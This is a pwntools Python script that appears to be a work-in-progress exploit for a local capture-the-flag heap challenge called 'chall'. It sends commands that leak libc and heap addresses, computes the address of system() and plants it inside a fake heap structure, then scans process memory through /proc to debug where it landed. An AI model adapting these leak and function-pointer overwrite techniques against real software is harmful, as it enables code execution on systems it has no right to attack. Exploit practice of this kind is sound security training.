from pwn import *
context.binary = './chall'
context.log_level = 'error'
import os
os.environ['LD_LIBRARY_PATH'] = '.'
p = process(['./ld-linux-x86-64.so.2','--library-path','.','./chall'])
def cmd(c):
    p.recvuntil(b'glyph> '); p.sendline(c)
cmd(b'load /bin/sh'); cmd(b'style a'); cmd(b'layout'); cmd(b'paint')
cmd(b'style b'); cmd(b'optimize')
cmd(b'inspect paint raw')
p.recvuntil(b'raw='); raw=p.recvline().strip(); b=bytes.fromhex(raw.decode())
libc_leak=u64(b[0:8]); heap_leak=u64(b[8:16])
print(f"libc={libc_leak:#x} heap(bk)={heap_leak:#x}")
pid=p.pid
maps=open(f'/proc/{pid}/maps').read()
heap_range=[l for l in maps.splitlines() if '[heap]' in l][0]
hs,he=heap_range.split()[0].split('-')
hs=int(hs,16); he=int(he,16)
print(f"heap {hs:#x}-{he:#x}")
f=open(f'/proc/{pid}/mem','rb',0)
def readmem(addr,n):
    f.seek(addr)
    try: return f.read(n)
    except: return b'<err>'
payload1 = b'\x00'*16 + p64(heap_leak)
cmd(b'profile add ' + payload1.hex().encode())
MAGIC=b"GYPHFLIF"
system = libc_leak - 0x203b20 + 0x58750
payload2 = MAGIC + p64(system)
cmd(b'profile add ' + payload2.hex().encode())
# scan heap for MAGIC
data=readmem(hs, he-hs)
idx=0
locs=[]
while True:
    i=data.find(MAGIC, idx)
    if i<0: break
    locs.append(hs+i)
    idx=i+1
print("MAGIC found at:", [hex(x) for x in locs])
print(f"heap_leak={heap_leak:#x}, heap_leak+0x8={heap_leak+8:#x}, heap_leak+0x10={heap_leak+0x10:#x}")
# also find paint_buffer (chunkA0) - scan for heap_leak value (we wrote it at +0x10)
idx=0
pbuf_locs=[]
tgt=p64(heap_leak)
while True:
    i=data.find(tgt, idx)
    if i<0: break
    pbuf_locs.append(hs+i)
    idx=i+1
print("heap_leak value found at:", [hex(x) for x in pbuf_locs])
p.close()
